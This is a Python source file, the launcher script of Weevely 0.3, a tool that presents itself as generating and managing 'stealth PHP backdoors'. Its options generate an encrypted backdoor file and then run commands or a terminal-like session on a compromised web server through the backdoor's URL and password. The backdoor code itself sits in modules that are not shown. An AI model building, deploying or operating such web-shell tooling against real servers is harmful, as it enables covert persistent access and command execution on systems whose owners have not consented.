#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

if __name__ == "__main__":
	print ( "\n  Weevely 0.3 - Generate and manage stealth PHP backdoors.\n" + \
			"  Copyright (c) 2011-2012 Weevely Developers\n" + \
			"  Website: http://code.google.com/p/weevely/\n" + \
			"  Original work: Emilio Pinna\n" );

	from optparse import OptionParser	

	opt = OptionParser( usage = "usage: %prog [options]\n" )

	opt.add_option( "-g", "--generate", action="store_true", dest="generate", default=False, help="Generate backdoor crypted code, requires -o and -p ." )
	opt.add_option( "-o", "--output",   action="store",	     dest="output",   default=None,  help="Output filename for generated backdoor ." )
	opt.add_option( "-c", "--command",  action="store", 	 dest="command",  default=None,  help="Execute a single command and exit, requires -u and -p ." )
	opt.add_option( "-t", "--terminal", action="store_true", dest="terminal", default=False, help="Start a terminal-like session, requires -u and -p ." )
	opt.add_option( "-p", "--password", action="store", 	 dest="password", default=None,  help="Password of the encrypted backdoor ." )
	opt.add_option( "-u", "--url",   	action="store", 	 dest="url", 	  default=None,  help="Remote backdoor URL ." )

	try:
		(options, args) = opt.parse_args()

		if options.generate == True:
			if options.output == None:
				opt.error( "No output file specified." )
			elif options.password == None:
				opt.error( "No password specified." )
			else:
				from core.backdoor import Backdoor

				Backdoor( options.password ).save( options.output )
		elif options.command != None:
			if options.url == None:
				opt.error( "No backdoor url specified." )
			elif options.password == None:
				opt.error( "No password specified." )
			else:
				from core.shell import Shell

				print "\n" + Shell( options.url, options.password ).execute( options.command )
		elif options.terminal == True:
			if options.url == None:
				opt.error( "No backdoor url specified." )
			elif options.password == None:
				opt.error( "No password specified." )
			else:
				from core.terminal import Terminal

				Terminal( options.url, options.password ).run()
		
	except KeyboardInterrupt:
		print "\n+ Bye ^^"
	except Exception as e:
		print "\n! %s" % e
